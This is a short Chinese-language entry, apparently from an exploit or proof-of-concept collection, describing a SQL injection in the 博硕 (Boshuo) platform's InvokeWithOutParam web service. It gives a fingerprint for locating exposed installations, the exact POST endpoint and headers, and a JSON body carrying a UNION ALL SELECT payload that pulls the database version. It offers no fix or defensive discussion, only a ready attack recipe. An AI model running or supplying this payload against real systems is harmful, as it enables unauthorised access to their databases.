# 博硕BGMInvokeWithOutParam存在SQL注入漏洞

- **系统**：博硕　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/InvokeWithOutParam HTTP/1.1`
- **关键头**：`Appstatecount: 1`　`Content-Type: application/json`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
"assembly": "Crystal.PlatForm.Basic",
"className": "Crystal.PlatForm.Basic.clsDictionary",
"method": "GetDicCommonItem",
"isCacheInvoke": true,
"param": ["1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL-- VJMn"]
}
```
- **预期**：200　|　—